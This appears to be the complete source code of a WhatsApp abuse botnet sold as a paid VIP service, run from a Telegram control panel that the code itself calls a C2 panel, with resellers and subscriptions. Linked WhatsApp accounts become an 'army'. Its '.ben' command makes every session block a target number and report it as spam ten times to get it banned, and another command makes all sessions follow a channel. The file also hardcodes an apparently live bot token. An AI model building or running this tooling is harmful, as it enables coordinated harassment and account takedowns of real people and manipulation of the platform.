/**
 * 👑 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 - 𝑫𝒐𝒐𝒎𝒔𝒅𝒂𝒚 𝑬𝒅𝒊𝒕𝒊𝒐𝒏 👑
 * النسخة النووية النهائية - إبلاغ (10x) + متابعة جماعية + ترحيب آلي فخم
 * تم إضافة خادم الويب (Express) لمنع منصة Render من إغلاق السيرفر
 */

const { Telegraf, Markup } = require('telegraf');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    jidNormalizedUser // 🆕 نحتاجها لمعرفة رقم الجلسة ومراسلته
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');

// ==========================================
// 🌐 إضافة سيرفر وهمي لإرضاء منصة Render ومنع الانهيار (Status 1)
// ==========================================
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('👑 TARZAN BEN ULTRA VIP IS RUNNING ON RENDER! 😈');
});

app.listen(PORT, () => {
    console.log(`🌐 خادم الويب يعمل على المنفذ ${PORT} (تم تخطي فحص Render بنجاح)`);
});

// ==========================================
// ⚙️ إعدادات المالك (كما أدخلتها أنت)
// ==========================================
const TG_TOKEN = '8831436238:AAF9M5hGwNbQwfoLKOr_XYS2Qij6WOA7Krw'; 
const OWNER_ID = 8794826397; // آيدي حسابك في التلجرام
const DB_FILE = './tarzan_database.json';

// ==========================================
// 📂 قاعدة البيانات المحلية
// ==========================================
let db = {
    config: { mode: 'FREE' },
    users: {}, // تخزين المشتركين (Users/Resellers)
    sessions: {} // الجلسات المرتبطة وتتبع حالة رسالة الترحيب
};

if (fs.existsSync(DB_FILE)) db = JSON.parse(fs.readFileSync(DB_FILE));
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));

const activeSockets = {}; // السيرفرات النشطة
const userStates = {}; // لتتبع خطوات التلجرام

// ==========================================
// 🔥 نظام الواتساب (أسلحة الدمار)
// ==========================================

async function startWhatsAppSession(sessionId, phoneNumber = null, tgContext = null) {
    const sessionDir = path.join(__dirname, 'sessions', sessionId);
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    
    const sock = makeWASocket({
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        printQRInTerminal: false,
        logger: pino({ level: 'silent' }),
        browser: ["Tarzan VIP Ultra", "Edge", "110.0.0"]
    });

    activeSockets[sessionId] = sock;
    sock.ev.on('creds.update', saveCreds);

    // 🔑 استخراج كود الربط (Pair Code)
    if (phoneNumber && !sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(phoneNumber.replace(/[^0-9]/g, ''));
                if (tgContext) {
                    tgContext.replyWithMarkdownV2(
                        `🔱 *تم إنشاء كود الربط الملكي* 🔱\n\n` +
                        `🔑 *الكود:* \`${code}\`\n\n` +
                        `⚠️ *طريقة الاستخدام:*\n` +
                        `1\\. افتح الواتساب\n` +
                        `2\\. الأجهزة المرتبطة > ربط جهاز\n` +
                        `3\\. اختر "الربط برقم هاتف بدلاً من ذلك"\n` +
                        `4\\. أدخل الكود\n\n` +
                        `👑 *𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨*`
                    );
                }
            } catch (e) {
                if (tgContext) tgContext.reply("❌ تعذر إنشاء الكود. تأكد من صحة الرقم.");
            }
        }, 3000);
    }

    // ⚔️ استقبال أوامر الواتساب من الجلسات المربوطة
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

        // 💀 1. أمر الإبادة النووي (.ben)
        if (body.startsWith('.ben ')) {
            const target = body.split(' ')[1];
            if (!target) return;
            
            const targetJid = target.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            
            await sock.sendMessage(from, { text: `⚔️ *𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑫𝑶𝑶𝑴𝑺𝑫𝑨𝒀* ⚔️\n\n🎯 *الهدف:* ${target}\n💀 *العملية:* جاري إطلاق 10 بلاغات متتالية من كل جلسة مرتبطة!` }, { quoted: msg });

            let totalReports = 0;
            
            // حلقة الهجوم: كل جلسة تقوم بالضرب 10 مرات
            for (const sId in activeSockets) {
                const session = activeSockets[sId];
                for (let i = 0; i < 10; i++) {
                    try {
                        await session.updateBlockStatus(targetJid, 'block'); // حظر
                        await session.reportSpam(targetJid); // إبلاغ
                        totalReports++;
                        await new Promise(resolve => setTimeout(resolve, 300)); // تأخير 300 ملي ثانية للحماية
                    } catch (e) {}
                }
            }

            await sock.sendMessage(from, { text: `✅ *اكتملت عملية الإبادة*\n\n🔥 *إجمالي البلاغات المُرسلة:* ${totalReports} بلاغ وحظر!\n💀 *تم سحق الهدف بنجاح.*` }, { quoted: msg });
        }

        // 📢 2. أمر المتابعة الجماعية للقنوات (.متابعه)
        if (body.startsWith('.متابعه ') || body.startsWith('.متابعة ')) {
            const link = body.split(' ')[1];
            if (!link || !link.includes('whatsapp.com/channel/')) {
                return sock.sendMessage(from, { text: '⚠️ *يرجى إرفاق رابط قناة واتساب صحيح بعد الأمر.*\nمثال: .متابعه https://whatsapp.com/channel/...' }, { quoted: msg });
            }

            const inviteCode = link.split('channel/')[1].split('/')[0];
            await sock.sendMessage(from, { text: `🔄 *𝑻𝑨𝑹𝒁𝑨𝑵 𝑪𝑯𝑨𝑵𝑵𝑬𝑳 𝑩𝑶𝑶𝑺𝑻* 🔄\n\n⏳ *جاري توجيه جميع الجلسات لمتابعة القناة...*` }, { quoted: msg });

            let followCount = 0;
            for (const sId in activeSockets) {
                const session = activeSockets[sId];
                try {
                    const metadata = await session.newsletterMetadata("invite", inviteCode);
                    if (metadata && metadata.id) {
                        await session.newsletterFollow(metadata.id);
                        followCount++;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (e) {}
            }

            await sock.sendMessage(from, { text: `✅ *اكتملت المهمة!*\n\n👥 *عدد الحسابات التي تابعت القناة:* ${followCount} جلسة.` }, { quoted: msg });
        }
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                setTimeout(() => startWhatsAppSession(sessionId), 5000);
            } else {
                delete activeSockets[sessionId];
                delete db.sessions[sessionId];
                saveDB();
            }
        } else if (connection === 'open') {
            console.log(`✅ [SESSION ACTIVE]: ${sessionId}`);
            
            // 🌟 إرسال رسالة الترحيب الآلية عند الربط لأول مرة
            if (!db.sessions[sessionId]) db.sessions[sessionId] = {};
            if (!db.sessions[sessionId].welcomeSent) {
                try {
                    const selfJid = jidNormalizedUser(sock.user.id);
                    const welcomeMsg = `👑 *مرحباً بك في عالم 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷* 👑\n\n` +
                                       `✅ *تم ربط جهازك بنجاح ضمن جيش طرزان.*\n` +
                                       `أنت الآن تمتلك قوة تدميرية هائلة بين يديك! 😈\n\n` +
                                       `📜 *دليل الأوامر الحصرية (تُرسل في أي محادثة):*\n\n` +
                                       `1️⃣ *أمر الإبادة (.ben)*\n` +
                                       `استخدمه لحظر وإطارة أي رقم مزعج.\n` +
                                       `*الطريقة:* أرسل \`.ben +9677...\`\n` +
                                       `*النتيجة:* سيقوم السيرفر بتوجيه 10 بلاغات متتالية وحظر من جميع الجلسات النشطة في وقت واحد!\n\n` +
                                       `2️⃣ *أمر الدعم الجماعي (.متابعه)*\n` +
                                       `استخدمه لرفع متابعين قنوات الواتساب فوراً.\n` +
                                       `*الطريقة:* أرسل \`.متابعه https://whatsapp.com/channel/...\`\n` +
                                       `*النتيجة:* ستدخل جميع الحسابات المربوطة وتتابع القناة بصمت.\n\n` +
                                       `⚠️ *تحذير:* استخدم قوتك بحكمة، ولا تشارك أوامرك مع الغرباء.\n` +
                                       `🔱 *مع تحيات الإدارة العليا | 𝑻𝑨𝑹𝒁𝑨𝑵*`;
                    
                    await sock.sendMessage(selfJid, { text: welcomeMsg });
                    
                    db.sessions[sessionId].welcomeSent = true;
                    saveDB();
                    console.log(`💌 تم إرسال دليل الاستخدام بنجاح للجلسة: ${sessionId}`);
                } catch (err) {
                    console.error("❌ فشل إرسال رسالة الترحيب:", err);
                }
            }
        }
    });
}

// ==========================================
// 📱 لوحة تحكم التلجرام (C2 Panel)
// ==========================================
const bot = new Telegraf(TG_TOKEN);

bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    const isOwner = userId === OWNER_ID.toString();
    const userRecord = db.users[userId];
    
    let role = 'GUEST';
    if (isOwner) role = 'OWNER';
    else if (userRecord) role = userRecord.role;

    if (db.config.mode === 'PAID' && role === 'GUEST') {
        return ctx.reply("❌ *نظام 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 حالياً في وضع VIP (للمشتركين فقط).* \nلا تملك صلاحية الدخول.", { parse_mode: 'Markdown' });
    }

    const roleNames = { 'OWNER': '👑 الزعيم الأكبر', 'RESELLER': '💎 موزع معتمد', 'USER': '👤 عضو VIP', 'GUEST': '🆓 مستخدم مجاني' };

    let buttons = [[Markup.button.callback('🔗 ربط جلسة (Pair Code)', 'action_pair')]];

    if (role === 'OWNER' || role === 'RESELLER') {
        buttons.push([Markup.button.callback('🎫 منح اشتراك VIP لشخص', 'action_add_user')]);
    }
    
    if (role === 'OWNER') {
        buttons.push([Markup.button.callback('🎖️ ترقية شخص لموزع', 'action_add_reseller')]);
        buttons.push([
            Markup.button.callback('🔓 تفعيل المجاني', 'mode_free'), 
            Markup.button.callback('🔐 تفعيل المدفوع', 'mode_paid')
        ]);
    }

    ctx.replyWithMarkdownV2(
        `🔱 *𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 \\- 𝑪𝑶𝑵𝑻𝑹𝑶𝑳 𝑷𝑨𝑵𝑬𝑳* 🔱\n\n` +
        `👤 *رتبتك:* \`${roleNames[role]}\`\n` +
        `📊 *وضع النظام:* \`${db.config.mode}\`\n` +
        `📡 *قوة الجيش (الجلسات النشطة):* \`${Object.keys(activeSockets).length}\` جلسة\n\n` +
        `اختر العملية المراد تنفيذها:`,
        Markup.inlineKeyboard(buttons)
    );
});

// --- معالجة أزرار التلجرام ---
bot.action('action_pair', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAITING_PHONE' };
    ctx.reply("📱 *أرسل رقم الهاتف الذي تريد ربطه الآن:*\n(مع مفتاح الدولة، مثال: 96773...)", { parse_mode: 'Markdown' });
});

bot.action('action_add_user', (ctx) => {
    userStates[ctx.from.id] = { action: 'WAITING_USER_ID' };
    ctx.reply("🎫 *أرسل آيدي (ID) التلجرام للشخص المراد منحه اشتراك VIP:*", { parse_mode: 'Markdown' });
});

bot.action('action_add_reseller', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;
    userStates[ctx.from.id] = { action: 'WAITING_RESELLER_ID' };
    ctx.reply("💎 *أرسل آيدي (ID) التلجرام للشخص المراد ترقيته كموزع:*", { parse_mode: 'Markdown' });
});

bot.action('mode_free', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;
    db.config.mode = 'FREE'; saveDB();
    ctx.editMessageText("🔓 *تم التبديل إلى الوضع المجاني (الكل يمكنه الربط)*", { parse_mode: 'Markdown' });
});

bot.action('mode_paid', (ctx) => {
    if (ctx.from.id.toString() !== OWNER_ID.toString()) return;
    db.config.mode = 'PAID'; saveDB();
    ctx.editMessageText("🔐 *تم التبديل إلى الوضع المدفوع (للمشتركين فقط)*", { parse_mode: 'Markdown' });
});

// --- معالجة النصوص (حسب الحالة) ---
bot.on('text', (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    const state = userStates[userId];

    if (!state) return;

    if (state.action === 'WAITING_PHONE') {
        const phone = text.replace(/[^0-9]/g, '');
        if (phone.length < 10) return ctx.reply("❌ رقم غير صحيح.");
        
        const sId = `SESS_${Date.now()}`;
        db.sessions[sId] = { ownerTgId: userId, phone: phone };
        saveDB();
        
        ctx.reply("⏳ *جاري سحب كود الربط، انتظر لحظات...*", { parse_mode: 'Markdown' });
        startWhatsAppSession(sId, phone, ctx);
        delete userStates[userId];
    } 
    else if (state.action === 'WAITING_USER_ID') {
        db.users[text] = { role: 'USER', addedBy: userId, date: new Date().toISOString() };
        saveDB();
        ctx.reply(`✅ *تم تفعيل وصول VIP للآيدي:* \`${text}\``, { parse_mode: 'Markdown' });
        delete userStates[userId];
    }
    else if (state.action === 'WAITING_RESELLER_ID') {
        db.users[text] = { role: 'RESELLER', addedBy: userId, date: new Date().toISOString() };
        saveDB();
        ctx.reply(`💎 *تم ترقية المستخدم إلى موزع معتمد:* \`${text}\``, { parse_mode: 'Markdown' });
        delete userStates[userId];
    }
});

// ==========================================
// 🚀 إقلاع السيرفر الأوتوماتيكي
// ==========================================
const initSystem = async () => {
    console.log("===================================");
    console.log("🔥 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑬𝑵 𝑼𝑳𝑻𝑹𝑨 𝑽𝑰𝑷 𝑺𝒀𝑺𝑻𝑬𝑴 🔥");
    console.log("===================================");
    
    const sessionsDir = path.join(__dirname, 'sessions');
    if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);
    
    const folders = fs.readdirSync(sessionsDir).filter(f => !f.includes('.'));
    for (const folder of folders) {
        await startWhatsAppSession(folder);
    }
    
    bot.launch();
    console.log(`✅ النظام متصل | الجلسات الجاهزة للهجوم: ${folders.length}`);
};

initSystem();

// حماية السيرفر من التعطل
process.on('uncaughtException', console.error);
process.on('unhandledRejection', console.error);
